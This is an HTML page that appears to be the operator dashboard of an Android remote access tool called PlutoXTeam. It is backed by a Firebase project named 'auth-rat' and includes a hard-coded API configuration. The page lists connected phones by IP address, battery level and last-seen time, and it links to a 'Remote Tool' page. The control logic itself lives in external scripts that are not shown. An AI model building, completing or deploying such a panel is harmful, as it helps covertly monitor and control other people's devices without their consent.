<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PlutoXTeam Monitor</title>

<!-- Firebase -->
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>

<link rel="stylesheet" href="css/style.css">

<style>
/* Logout button */
.logout-btn {
    position: fixed;
    top: 1rem;
    right: 1rem;
    padding: 10px 16px;
    background-color: #ff4d4d;
    color: #fff;
    border: none;
    border-radius: 8px;
    font-weight: bold;
    font-size: 14px;
    cursor: pointer;
    z-index: 1000;
}
.logout-btn:hover {
    background-color: #e04343;
}
</style>
</head>
<body>

<!-- Logout Button -->
<button class="logout-btn" onclick="logout()">Logout</button>

<div class="layout">
    <div class="sidebar-overlay"></div>
    <aside class="sidebar">
        <a href="index.html" class="brand">
            <img src="img/logo.jpg" alt="PlutoXTeam"
                style="height: 32px; width: 32px; border-radius: 6px; object-fit: cover;">
            PlutoXTeam
        </a>

        <div class="nav-title">Main</div>
        <a href="index.html" class="nav-link active">
            All Devices
        </a>
        <a href="#" id="link-dashboard" class="nav-link">Dashboard</a>
        <a href="remote.html" id="link-remote" class="nav-link">Remote Tool</a>

        <a href="https://github.com/Red-Devils-pro" target="_blank" class="nav-link"
            style="margin-top: auto; color: #4b5563;">
            GitHub
        </a>
    </aside>

    <main class="content">
        <div class="mobile-header">
            <button class="mobile-toggle">
                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                        d="M4 6h16M4 12h16M4 18h16" />
                </svg>
            </button>
            <div class="mobile-brand">
                <img src="img/logo.jpg" alt="PlutoXTeam"
                    style="height: 28px; width: 28px; border-radius: 4px; object-fit: cover;">
                PlutoXTeam
            </div>
            <div style="width: 24px;"></div>
        </div>

        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:2rem;">
            <h1>Dashboard</h1>
            <div id="connection-status" class="status-badge">Connecting...</div>
        </div>

        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-value" id="total-devices">0</div>
                <div class="stat-label">Total Devices</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="online-devices">0</div>
                <div class="stat-label">Online</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="offline-devices">0</div>
                <div class="stat-label">Offline</div>
            </div>
        </div>

        <div class="card">
            <h2>Connected Devices</h2>
            <div class="table-container">
                <table>
                    <thead>
                        <tr>
                            <th>Status</th>
                            <th>Device Name</th>
                            <th>Android Ver</th>
                            <th>Battery</th>
                            <th>IP Address</th>
                            <th>Last Seen</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody id="devices-table-body">
                        <tr>
                            <td colspan="7" style="text-align: center;">Loading devices...</td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>

    </main>
</div>

<div class="footer">Powered by PlutoXTeam</div>

<script>
// ===== FIREBASE CONFIG (tidak diubah) =====
firebase.initializeApp({
  apiKey:"AIzaSyCg5jaxHtALGbHssWD6sk7EklZsj3EFSLk",
  authDomain:"auth-rat.firebaseapp.com",
  projectId:"auth-rat",
  storageBucket:"auth-rat.appspot.com",
  messagingSenderId:"211012554206",
  appId:"1:211012554206:web:f0697a1b9289659754a14f"
});

const auth = firebase.auth();

// ===== PROTECT PAGE: jika belum login, redirect ke login.html =====
auth.onAuthStateChanged(user => {
  if (!user) {
    window.location.href = "login.html";
  }
});

// ===== LOGOUT function =====
function logout() {
  auth.signOut().then(() => {
    window.location.href = "login.html";
  });
}
</script>

<script src="js/app.js"></script>
<script src="js/ui.js"></script>
<script src="js/integrity.js"></script>

</body>
</html>
